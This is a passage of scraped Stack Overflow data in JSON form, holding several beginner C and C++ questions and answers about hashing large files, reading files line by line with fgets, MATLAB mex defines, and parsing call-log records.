"hash"], "comments": [{"owner": {"reputation": 6463, "user_id": 6387170, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d425edf9cc20e61c8cc3be162915f06?s=128&d=identicon&r=PG&f=1", "display_name": "UKMonkey", "link": "https://stackoverflow.com/users/6387170/ukmonkey"}, "edited": false, "score": 0, "creation_date": 1476271748, "post_id": 39997400, "comment_id": 67272628, "body": "Is this what you&#39;re looking for?<a href=\"http://stackoverflow.com/questions/1220046/how-to-get-the-md5-hash-of-a-file-in-c\" title=\"how to get the md5 hash of a file in c\">stackoverflow.com/questions/1220046/&hellip;</a>"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1476272653, "post_id": 39997400, "comment_id": 67273251, "body": "The tweetnacl source code probably contains what you are looking for."}, {"owner": {"reputation": 13, "user_id": 4817865, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cadc8693b2bac70e7308f01cd678a240?s=128&d=identicon&r=PG", "display_name": "snmed", "link": "https://stackoverflow.com/users/4817865/snmed"}, "reply_to_user": {"reputation": 6463, "user_id": 6387170, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2d425edf9cc20e61c8cc3be162915f06?s=128&d=identicon&r=PG&f=1", "display_name": "UKMonkey", "link": "https://stackoverflow.com/users/6387170/ukmonkey"}, "edited": false, "score": 0, "creation_date": 1476274978, "post_id": 39997400, "comment_id": 67274661, "body": "@UKMonkey Looks promising..."}, {"owner": {"reputation": 13, "user_id": 4817865, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cadc8693b2bac70e7308f01cd678a240?s=128&d=identicon&r=PG", "display_name": "snmed", "link": "https://stackoverflow.com/users/4817865/snmed"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1476275148, "post_id": 39997400, "comment_id": 67274762, "body": "@MichaelWalz Unfortunately the documentation is really rare and although i dug into the source file, i couldn&#39;t find anything. But i admit i&#39;m a c++ beginner and so not everything is clear to me in the source file."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1476275461, "post_id": 39997400, "comment_id": 67274970, "body": "@ConfoederatioHelvetica BTW tweetnacl is in C not C++"}, {"owner": {"reputation": 13, "user_id": 4817865, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cadc8693b2bac70e7308f01cd678a240?s=128&d=identicon&r=PG", "display_name": "snmed", "link": "https://stackoverflow.com/users/4817865/snmed"}, "reply_to_user": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1476275692, "post_id": 39997400, "comment_id": 67275132, "body": "@MichaelWalz i know but my program is c++ :-)"}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 4817865, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cadc8693b2bac70e7308f01cd678a240?s=128&d=identicon&r=PG", "display_name": "snmed", "link": "https://stackoverflow.com/users/4817865/snmed"}, "edited": false, "score": 0, "creation_date": 1476275639, "post_id": 39997868, "comment_id": 67275102, "body": "It looks promising to me, i will check it out this evening and accept the answer if it works for me."}], "tags": [], "owner": {"reputation": 16850, "user_id": 172642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0a2a18a04255beea3beff827eecedd64?s=128&d=identicon&r=PG", "display_name": "gavinb", "link": "https://stackoverflow.com/users/172642/gavinb"}, "is_accepted": false, "score": 3, "last_activity_date": 1476272949, "creation_date": 1476272949, "answer_id": 39997868, "question_id": 39997400, "link": "https://stackoverflow.com/questions/39997400/c-tweetnacl-hash-a-file-without-read-whole-file-to-memory/39997868#39997868", "title": "C++ Tweetnacl hash a file without read whole file to memory", "body": "<p>Probably the easiest way is to use a <a href=\"https://en.wikipedia.org/wiki/Memory-mapped_file\" rel=\"nofollow\">memory-mapped file</a>. This lets you open a file and map it into virtual memory, then you can treat the file on disk as if it is in memory, and the OS will load pages as required.</p>\n\n<p>So in your case, open your file and use <code>mmap()</code> to map it into memory. Then you can pass the pointer into your <code>crypto_hash()</code> function and let the OS do the work.</p>\n\n<p>Note that there are caveats to do with how large the file is wrt virtual memory.</p>\n\n<p>For various platforms:</p>\n\n<ul>\n<li><a href=\"http://www.boost.org/doc/libs/1_62_0/libs/iostreams/doc/classes/mapped_file.html\" rel=\"nofollow\">Boost Interprocess</a></li>\n<li><a href=\"https://developer.apple.com/library/prerelease/content/documentation/FileManagement/Conceptual/FileSystemAdvancedPT/MappingFilesIntoMemory/MappingFilesIntoMemory.html#//apple_ref/doc/uid/TP40010765-CH2-SW1\" rel=\"nofollow\">macOS and <code>mmap</code></a></li>\n<li><a href=\"https://www.safaribooksonline.com/library/view/linux-system-programming/0596009585/ch04s03.html\" rel=\"nofollow\">Linux and <code>mmap</code></a></li>\n<li><a href=\"https://msdn.microsoft.com/en-us/library/dd997372(v=vs.110).aspx\" rel=\"nofollow\">Windows .NET MemoryMappedFile</a></li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 13, "user_id": 4817865, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cadc8693b2bac70e7308f01cd678a240?s=128&d=identicon&r=PG", "display_name": "snmed", "link": "https://stackoverflow.com/users/4817865/snmed"}, "edited": false, "score": 0, "creation_date": 1476276491, "post_id": 39998391, "comment_id": 67275683, "body": "Thx this is probably the better solution, especially it&#39;s also really small and i doesn&#39;t need to map any file to memory. Strange i didn&#39;t find it while searching for a small library... :-("}, {"owner": {"reputation": 3864, "user_id": 620908, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2abd643ecb33f1a18a7a4f976cef0dbe?s=128&d=identicon&r=PG", "display_name": "Adrian Colomitchi", "link": "https://stackoverflow.com/users/620908/adrian-colomitchi"}, "reply_to_user": {"reputation": 13, "user_id": 4817865, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cadc8693b2bac70e7308f01cd678a240?s=128&d=identicon&r=PG", "display_name": "snmed", "link": "https://stackoverflow.com/users/4817865/snmed"}, "edited": false, "score": 0, "creation_date": 1476276790, "post_id": 39998391, "comment_id": 67275903, "body": "@ConfoederatioHelvetica &quot;Strange i didn&#39;t find it while searching for a small library...&quot; I used &quot;sha512 stream c++&quot; with google. The first result was  <a href=\"http://www.zedwood.com/article/cpp-sha512-function\" rel=\"nofollow noreferrer\">this</a> C++ incarnation, which has  in the license.txt the link that I posted."}, {"owner": {"reputation": 13, "user_id": 4817865, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cadc8693b2bac70e7308f01cd678a240?s=128&d=identicon&r=PG", "display_name": "snmed", "link": "https://stackoverflow.com/users/4817865/snmed"}, "edited": false, "score": 0, "creation_date": 1476279231, "post_id": 39998391, "comment_id": 67277687, "body": "I have to admit i searched only with &quot;c++ sha512 library&quot;, now it seems obvious to me, to search for stream and sha512. sorry for my omissons."}], "tags": [], "owner": {"reputation": 3864, "user_id": 620908, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2abd643ecb33f1a18a7a4f976cef0dbe?s=128&d=identicon&r=PG", "display_name": "Adrian Colomitchi", "link": "https://stackoverflow.com/users/620908/adrian-colomitchi"}, "is_accepted": true, "score": 2, "last_activity_date": 1476275552, "last_edit_date": 1476275552, "creation_date": 1476274574, "answer_id": 39998391, "question_id": 39997400, "link": "https://stackoverflow.com/questions/39997400/c-tweetnacl-hash-a-file-without-read-whole-file-to-memory/39998391#39998391", "title": "C++ Tweetnacl hash a file without read whole file to memory", "body": "<p>I'd suggest you to use a different implementation, one which you can incrementally feed in chunks. </p>\n\n<p><a href=\"http://www.ouah.org/ogay/sha2/\" rel=\"nofollow\">This one for example</a>. As the licence is bsd and the code is C with no dependencies, you can copy/paste only the 3 functions that you need without bringing a whole lib (no matter how small) into your project.</p>\n\n<p>The life-cycle goes like:</p>\n\n<ul>\n<li><p><code>sha256_init(&amp;ctx)</code></p></li>\n<li><p>repeatedly read blocks from file and feed them into <code>sha256_update(&amp;ctx, buff, buffLen)</code></p></li>\n<li><p>when EOF, get your digest using <code>sha256_final(&amp;ctx, digestHere)</code></p></li>\n</ul>\n"}], "owner": {"reputation": 13, "user_id": 4817865, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cadc8693b2bac70e7308f01cd678a240?s=128&d=identicon&r=PG", "display_name": "snmed", "link": "https://stackoverflow.com/users/4817865/snmed"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 446, "favorite_count": 0, "accepted_answer_id": 39998391, "answer_count": 2, "score": 1, "last_activity_date": 1476275552, "creation_date": 1476271568, "question_id": 39997400, "link": "https://stackoverflow.com/questions/39997400/c-tweetnacl-hash-a-file-without-read-whole-file-to-memory", "title": "C++ Tweetnacl hash a file without read whole file to memory", "body": "<p>I'm using tweetnacl to generate sha512 hashes of strings and file. For strings it works quite well but i have no idea how to do it with files.</p>\n\n<p>The signature of the function ist</p>\n\n<pre><code>extern \"C\" int crypto_hash(u8 *out, const u8 *m, u64 n);\n</code></pre>\n\n<p>where u8 is of type unsigned char and u64 is of unsigend long long.\nFor string a can use it like that</p>\n\n<pre><code>string s(\"Hello\");\nunsigned char h[64];\n\ncrypto_hash(h, (unsigned char *)s.c_str(), s.size());\n</code></pre>\n\n<p>This works great for a string and small files but if i want to create a hash for a big file, it is not viable and uses to much memory. I searching for a solution to read the file byte by byte and pass it as unsigend char pointer to that function. Has anyone a idea how to achieve that?</p>\n\n<p>P.S Sorry for the poor English.\np.s.s I use tweetnacl because of the small size and i need only the hashing function.</p>\n"}, {"tags": ["c", "file", "while-loop", "hashtable"], "comments": [{"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1476271266, "post_id": 39997042, "comment_id": 67272341, "body": "Bear in mind that <code>fgets</code> retains a <code>newline</code> at the end of each input. You can remove it with this line: <code>word [ strcspn(word, &quot;\\r\\n&quot;) ] = 0;</code>"}], "answers": [{"tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": true, "score": 2, "last_activity_date": 1476270533, "creation_date": 1476270533, "answer_id": 39997091, "question_id": 39997042, "link": "https://stackoverflow.com/questions/39997042/error-code-on-my-while-loop-trying-to-read-line-by-line-through-a-file-in-c/39997091#39997091", "title": "Error code on my while loop, trying to read line by line through a file. in C", "body": "<p><code>feof</code> is the identifier of a library function. Please change</p>\n\n<pre><code>while ( (fgets(word, 46, dic)) != feof )\n</code></pre>\n\n<p>to</p>\n\n<pre><code>while ( (fgets(word, 46, dic)) != NULL )\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "is_accepted": false, "score": 0, "last_activity_date": 1476270579, "creation_date": 1476270579, "answer_id": 39997106, "question_id": 39997042, "link": "https://stackoverflow.com/questions/39997042/error-code-on-my-while-loop-trying-to-read-line-by-line-through-a-file-in-c/39997106#39997106", "title": "Error code on my while loop, trying to read line by line through a file. in C", "body": "<p>You get it because you compare the result of <code>fgets</code> against the <em>function</em> <code>feof</code>. You probably meant to write <code>feof(fp)</code> or perhaps <code>EOF</code>.</p>\n\n<p>Which is also wrong, since <code>fgets</code> return NULL upon errors.</p>\n"}], "owner": {"reputation": 43, "user_id": 7001523, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/9631cd69b50ba777f49f59b48c64a8ca?s=128&d=identicon&r=PG&f=1", "display_name": "Tyler Gotto", "link": "https://stackoverflow.com/users/7001523/tyler-gotto"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 44, "favorite_count": 0, "accepted_answer_id": 39997091, "answer_count": 2, "score": -1, "last_activity_date": 1476270579, "creation_date": 1476270346, "question_id": 39997042, "link": "https://stackoverflow.com/questions/39997042/error-code-on-my-while-loop-trying-to-read-line-by-line-through-a-file-in-c", "title": "Error code on my while loop, trying to read line by line through a file. in C", "body": "<p>I am trying to take input from the file dictionary, one line at a time, I know each line in the file dictionary is just one word. I am getting an error code when I try to compile this code and here the error is : </p>\n\n<p>dictionary.c:66:36: error: comparison of distinct pointer types ('char <em>' and 'int (</em>)(FILE *)')\n      [-Werror,-Wcompare-distinct-pointer-types]\n    while ( (fgets(word, 46, dic)) != feof )</p>\n\n<p>I am very new to coding, and am not sure if this can be done this way, if I am trying to use the wrong method or if I am just coding this incorrectly. Thank you for nay help in advance.</p>\n\n<pre><code>bool load(const char* dictionary)\n{\n    char word[46];\n    unsigned long key;\n\n    //remember file name\n    FILE* dic = fopen(dictionary , \"r\");\n    if (dic == NULL)\n        {\n            printf(\"Could not open file..\\n\");\n            return false;\n        }\n    while ( (fgets(word, 46, dic)) != feof )\n        {\n            numberWords++;\n            //Save new word\n            node* newWord = malloc(sizeof(node));\n            strcpy(newWord-&gt;dicWords, word);\n            newWord-&gt;next = NULL;\n            //Use Hash function on new word found\n            key = hash(word);\n            //Enter word into Hashtable\n            if ( hashTable[key] == NULL )\n                {\n                    hashTable[key] = newWord;\n                }\n            else\n                {\n                    newWord-&gt;next = hashTable[key];\n                    hashTable[key] = newWord;\n                }\n        }\n\n    fclose(dic);\n\n    return false;\n</code></pre>\n"}, {"tags": ["c", "matlab"], "comments": [{"owner": {"reputation": 3283, "user_id": 5449925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c49b7b01be22bb9223590dc6c8388a8?s=128&d=identicon&r=PG", "display_name": "houtanb", "link": "https://stackoverflow.com/users/5449925/houtanb"}, "edited": false, "score": 2, "creation_date": 1476267224, "post_id": 39996017, "comment_id": 67269829, "body": "I&#39;m guessing that in your <code>defines.h</code> you have a <code>#ifdef MATLAB_MEX</code> statement? This doesn&#39;t work?"}, {"owner": {"reputation": 135, "user_id": 6012983, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/86ac0f66662fc92aa5670c9dddeb6c29?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/6012983/alex"}, "reply_to_user": {"reputation": 3283, "user_id": 5449925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c49b7b01be22bb9223590dc6c8388a8?s=128&d=identicon&r=PG", "display_name": "houtanb", "link": "https://stackoverflow.com/users/5449925/houtanb"}, "edited": false, "score": 0, "creation_date": 1476270222, "post_id": 39996017, "comment_id": 67271676, "body": "Oh now I see, that it is obvious :) Didn&#39;t really think about it, but yes, that should work! Thanks for the hint :)!"}], "answers": [{"tags": [], "owner": {"reputation": 3283, "user_id": 5449925, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/4c49b7b01be22bb9223590dc6c8388a8?s=128&d=identicon&r=PG", "display_name": "houtanb", "link": "https://stackoverflow.com/users/5449925/houtanb"}, "is_accepted": false, "score": 1, "last_activity_date": 1476270676, "creation_date": 1476270676, "answer_id": 39997136, "question_id": 39996017, "link": "https://stackoverflow.com/questions/39996017/set-define-in-c-code-from-matlab/39997136#39997136", "title": "Set #define in c code from Matlab", "body": "<p>Just make sure you have something like the following in <code>defines.h</code></p>\n\n<pre><code>#ifndef MATLAB_MEX\n  // code to \"deactivate\" when compling mex functions\n#endif\n</code></pre>\n"}], "owner": {"reputation": 135, "user_id": 6012983, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/86ac0f66662fc92aa5670c9dddeb6c29?s=128&d=identicon&r=PG", "display_name": "Alex", "link": "https://stackoverflow.com/users/6012983/alex"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 130, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1476270676, "creation_date": 1476267121, "question_id": 39996017, "link": "https://stackoverflow.com/questions/39996017/set-define-in-c-code-from-matlab", "title": "Set #define in c code from Matlab", "body": "<p>I have a Matlab program that uses and compiles C code. Now the C code uses a </p>\n\n<pre><code>defines.h\n</code></pre>\n\n<p>file containing all the defines for my source code. Now there is one define that is making trouble in Matlab and I would like to \"deactivate\" it whenever Matlab is compiling the .c files. I do not want to remove the define since I need it, when I compile my source code with gcc (without Matlab).\nIs there any way to \"redefine\" a value within the compilation process in Matlab?</p>\n\n<p>Here is a code snippet of my compilation process from Matlab:</p>\n\n<pre><code>mex CFLAGS='$CFLAGS -Wall -Wextra -pedantic -std=c99 -DMATLAB_MEX' function.c\n</code></pre>\n\n<p>Thanks!</p>\n"}, {"tags": ["c", "file"], "comments": [{"owner": {"reputation": 26971, "user_id": 3073272, "user_type": "registered", "accept_rate": 48, "profile_image": "https://i.stack.imgur.com/hofYF.jpg?s=128&g=1", "display_name": "GorvGoyl", "link": "https://stackoverflow.com/users/3073272/gorvgoyl"}, "edited": false, "score": 0, "creation_date": 1476266309, "post_id": 39995690, "comment_id": 67269241, "body": "ayushi it would be same as if you read any file in c <a href=\"https://www.google.co.in/search?newwindow=1&amp;espv=2&amp;q=read+and+print+from+file+in+c&amp;oq=read+and+print+from+file+in+c&amp;gs_l=serp.12...0.0.0.83982.0.0.0.0.0.0.0.0..0.0....0...1c..64.serp..0.0.0.iWgCkAWSlLw\" rel=\"nofollow noreferrer\">google.co.in/&hellip;</a>"}, {"owner": {"reputation": 33, "user_id": 7006980, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92bb1942fa35710f42149c523927a3ea?s=128&d=identicon&r=PG&f=1", "display_name": "Ayushi", "link": "https://stackoverflow.com/users/7006980/ayushi"}, "reply_to_user": {"reputation": 26971, "user_id": 3073272, "user_type": "registered", "accept_rate": 48, "profile_image": "https://i.stack.imgur.com/hofYF.jpg?s=128&g=1", "display_name": "GorvGoyl", "link": "https://stackoverflow.com/users/3073272/gorvgoyl"}, "edited": false, "score": 0, "creation_date": 1476266310, "post_id": 39995690, "comment_id": 67269243, "body": "i tried this                                                                                      fscanf(fp,&quot;%d\\t%d-&amp;d-%d\\t%d:%d:%d\\t%s\\t%1f&quot;,&amp;queue-&gt;num,&amp;que&zwnj;&#8203;ue-&gt;dd,&amp;queue-&gt;mm,&amp;q&zwnj;&#8203;ueue-&gt;yy,&amp;queue-&gt;hr,&zwnj;&#8203;&amp;queue-&gt;min,&amp;queue-&gt;&zwnj;&#8203;sec,queue-&gt;status,&amp;q&zwnj;&#8203;ueue-&gt;call_dur);                                                           to store data in a linked list .But it is not working."}], "answers": [{"comments": [{"owner": {"reputation": 33, "user_id": 7006980, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92bb1942fa35710f42149c523927a3ea?s=128&d=identicon&r=PG&f=1", "display_name": "Ayushi", "link": "https://stackoverflow.com/users/7006980/ayushi"}, "edited": false, "score": 0, "creation_date": 1476268802, "post_id": 39995861, "comment_id": 67270809, "body": "Thanks,it worked.But what if i have to store data in a linked list and compare status(missed,outgoing,incoming) to form another linked list corresponding to status.That&#39;s why i tried storing it in a linked list using fscanf."}, {"owner": {"reputation": 1108, "user_id": 3795491, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/42ae3e8407acf24055cf54a9f61887c9?s=128&d=identicon&r=PG&f=1", "display_name": "Aidenhjj", "link": "https://stackoverflow.com/users/3795491/aidenhjj"}, "reply_to_user": {"reputation": 33, "user_id": 7006980, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92bb1942fa35710f42149c523927a3ea?s=128&d=identicon&r=PG&f=1", "display_name": "Ayushi", "link": "https://stackoverflow.com/users/7006980/ayushi"}, "edited": false, "score": 0, "creation_date": 1476287100, "post_id": 39995861, "comment_id": 67283539, "body": "OK. I&#39;ve worked on a better solution for you and added to my answer - let me know if this helps."}, {"owner": {"reputation": 33, "user_id": 7006980, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92bb1942fa35710f42149c523927a3ea?s=128&d=identicon&r=PG&f=1", "display_name": "Ayushi", "link": "https://stackoverflow.com/users/7006980/ayushi"}, "edited": false, "score": 0, "creation_date": 1476599752, "post_id": 39995861, "comment_id": 67408758, "body": "this is a big help.Thanks."}, {"owner": {"reputation": 1108, "user_id": 3795491, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/42ae3e8407acf24055cf54a9f61887c9?s=128&d=identicon&r=PG&f=1", "display_name": "Aidenhjj", "link": "https://stackoverflow.com/users/3795491/aidenhjj"}, "reply_to_user": {"reputation": 33, "user_id": 7006980, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92bb1942fa35710f42149c523927a3ea?s=128&d=identicon&r=PG&f=1", "display_name": "Ayushi", "link": "https://stackoverflow.com/users/7006980/ayushi"}, "edited": false, "score": 0, "creation_date": 1476612433, "post_id": 39995861, "comment_id": 67411577, "body": "If it&#39;s what you&#39;re looking for, you can accept the answer."}], "tags": [], "owner": {"reputation": 1108, "user_id": 3795491, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/42ae3e8407acf24055cf54a9f61887c9?s=128&d=identicon&r=PG&f=1", "display_name": "Aidenhjj", "link": "https://stackoverflow.com/users/3795491/aidenhjj"}, "is_accepted": true, "score": 0, "last_activity_date": 1476292215, "last_edit_date": 1495542805, "creation_date": 1476266658, "answer_id": 39995861, "question_id": 39995690, "link": "https://stackoverflow.com/questions/39995690/reading-mobile-datastrings-and-numbers-from-file-in-c/39995861#39995861", "title": "Reading mobile data(strings and numbers) from file in C", "body": "<p>This works. Not sure what you want to do with the data, but this prints to screen.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n#define MAXLINE 1000\n#define MAXARG 20\n\nFILE *f1;\n\nint main(int argc, char *argv[])\n{\n    char FileName[MAXARG];\n    char line[MAXLINE];\n\n    if (argc &lt;= 1) {\n        printf(\"Usage - reads FileName and prints\\n\");\n        return 0;\n    }\n    else {\n        strcpy(FileName, *++argv);\n    }\n\n    f1 = fopen(FileName, \"r\");\n\n    while (fgets(line, MAXLINE, f1)) {\n        printf(\"%s\", line);\n    }\n}\n</code></pre>\n\n<p>NB: to call it, you have to type the program name followed by the name of your file.</p>\n\n<p>If instead you want to run through and save data for parsing, try this (re-appropriated version of <a href=\"https://stackoverflow.com/questions/18036686/c-read-space-separated-values-from-file\">C read space-separated values from file</a>):</p>\n\n<pre><code>#define _XOPEN_SOURCE\n#include &lt;stdio.h&gt;\n#include &lt;time.h&gt;\n#include &lt;string.h&gt;\n\ntypedef struct  \n{  \n    char status[9];\n    time_t timestamp;\n    long int number;\n    int duration_mins; \n    time_t call_time;\n} Call; \n\nvoid dump_call(FILE *fp, const char *tag, const Call *c);\nint inputLine(FILE *fp, Call *c);\n\nenum { MAXCALL = 100 };\n\nint main(void)\n{\n    char line[4096];\n    Call calls[MAXCALL];\n\n    if (fgets(line, sizeof(line), stdin) == 0)\n        return 1;\n    for (int i = 0; i &lt; MAXCALL &amp;&amp; inputLine(stdin, &amp;calls[i]) != 0; i++)\n        dump_call(stdout, \"Call\", &amp;calls[i]);\n    return 0;\n}\n\nint inputLine(FILE *fp, Call *c)\n{  \n    struct tm tm;\n    // time_t epoch;\n    int out;\n    char temp[20], date_temp[9], time_temp[9];;\n    if ((out = fscanf(fp, \"%ld %s %s %s %d\", \n        &amp;c-&gt;number, date_temp, time_temp, c-&gt;status, &amp;c-&gt;duration_mins)) == 5) {\n        sprintf(temp, \"%s %s\", date_temp, time_temp);\n        if ( strptime(temp, \"%d-%m-%Y %H:%M:%S\", &amp;tm) != NULL )\n            c-&gt;timestamp = mktime(&amp;tm);\n        return -1;\n        }\n    return 0;\n}\n\nvoid dump_call(FILE *fp, const char *tag, const Call *c)  \n{  \n    char date_time[20];\n    strftime(date_time, 20, \"%d-%m-%Y %H:%M:%S\", localtime(&amp;(c-&gt;timestamp)));\n    fprintf(fp, \"%s: %-10ld %-24s %-17s %3d\\n\",  \n               tag, c-&gt;number, date_time, c-&gt;status, c-&gt;duration_mins);\n}\n</code></pre>\n\n<p>This time, to call it, type name of program followed by <code>&lt;</code> and then name of data file; i.e:</p>\n\n<pre><code>read.exe &lt; test_mobil.dat\n</code></pre>\n\n<p>Hope this helps mate - I've learnt quite a bit as well - so thanks for that.</p>\n"}, {"comments": [{"owner": {"reputation": 13866, "user_id": 54200, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/6261c8ab215b8069e8290516c80445d8?s=128&d=identicon&r=PG", "display_name": "KevinDTimm", "link": "https://stackoverflow.com/users/54200/kevindtimm"}, "edited": false, "score": 0, "creation_date": 1476286470, "post_id": 39995864, "comment_id": 67283054, "body": "should be a comment"}], "tags": [], "owner": {"reputation": 25, "user_id": 6936639, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a91103d0a2b94be8314af10873b1c174?s=128&d=identicon&r=PG&f=1", "display_name": "Saurav Das", "link": "https://stackoverflow.com/users/6936639/saurav-das"}, "is_accepted": false, "score": 0, "last_activity_date": 1476266670, "last_edit_date": 1495540111, "creation_date": 1476266670, "answer_id": 39995864, "question_id": 39995690, "link": "https://stackoverflow.com/questions/39995690/reading-mobile-datastrings-and-numbers-from-file-in-c/39995864#39995864", "title": "Reading mobile data(strings and numbers) from file in C", "body": "<p>Check this answer -- \n<a href=\"https://stackoverflow.com/questions/4689747/how-to-read-specifically-formatted-data-from-a-file\">How to read specifically formatted data from a file?</a></p>\n\n<p>I believe it'll answer your question.. </p>\n"}], "owner": {"reputation": 33, "user_id": 7006980, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/92bb1942fa35710f42149c523927a3ea?s=128&d=identicon&r=PG&f=1", "display_name": "Ayushi", "link": "https://stackoverflow.com/users/7006980/ayushi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 61, "favorite_count": 0, "accepted_answer_id": 39995861, "answer_count": 2, "score": 0, "last_activity_date": 1476693709, "creation_date": 1476266089, "last_edit_date": 1476291240, "question_id": 39995690, "link": "https://stackoverflow.com/questions/39995690/reading-mobile-datastrings-and-numbers-from-file-in-c", "title": "Reading mobile data(strings and numbers) from file in C", "body": "<p>I have a file with data in the following format:</p>\n\n<pre><code>/*Number          Date    Time        Status    Call_duration(in minutes)   */  \n9893575103  22-09-2016  12:32:01    incoming         2\n9893575102  22-09-2016  12:44:05    outgoing         3\n9893575101  22-09-2016  12:59:23    missed           0\n9793575103  22-09-2016  13:30:32    outgoing         9  \n9723575103  22-09-2016  14:44:44    incoming         4\n</code></pre>\n\n<p>I want to be able to reliably read this data into a C program and then manipulate the data once it's been parsed.</p>\n\n<p>I tried to store data in a linked list after reading it from file using scanf:</p>\n\n<pre><code>struct Node {\n  struct node *queue;\n  struct node *front,*rear;\n  int num[10];\n  int dd,mm,yy,hr,min,sec;\n  float call_dur;\n  char status[15];\n};\n\nmain()\n\n{\n   node *rear=NULL;\n   node *front=NULL;\n   node *queue;\n   char ch;\n   FILE *fp;\n   fp=fopen(\"mobile_numbers.txt\",\"r\");\n   while((ch=getc(fp))!=EOF) {\n      fseek(fp,-1,1);\n      fscanf(fp,\"%d %d-%d-%d %d:%d:%d %s %d\", &amp;queue-&gt;num, &amp;queue-&gt;dd, &amp;queue-&gt;mm, &amp;queue-&gt;yy, &amp;queue-&gt;hr, &amp;queue-&gt;min, &amp;queue-&gt;sec, queue-&gt;status, &amp;queue-&gt;call_dur);\n    }\n\n    if(front==NULL)\n      front=queue;\n    else\n      rear-&gt;next=queue;\n    rear=queue;\n    queue-&gt;next=NULL;\n  }\n\nfclose(fp);\n\nwhile(queue!=NULL) {\n    printf(\"%d %d-%d-%d %d:%d:%d %s %d\",queue-&gt;num, queue-&gt;dd, queue-&gt;mm, queue-&gt;yy, queue-&gt;hr, queue-&gt;min, queue-&gt;sec, queue-&gt;status, queue-&gt;call_dur);\n    queue=queue-&gt;next;\n}\n</code></pre>\n\n<p>But this isn't giving required results? Can anyone suggest a better method or see what's wrong with my code?</p>\n"}, {"tags": ["c", "math"], "comments": [{"owner": {"reputation": 414, "user_id": 6764082, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6fdbf51557d43bad73b7048c7fcaacbf?s=128&d=identicon&r=PG&f=1", "display_name": "Miguel Sanchez", "link": "https://stackoverflow.com/users/6764082/miguel-sanchez"}, "edited": false, "score": 0, "creation_date": 1476264608, "post_id": 39995114, "comment_id": 67268098, "body": "why the <code>C#</code> 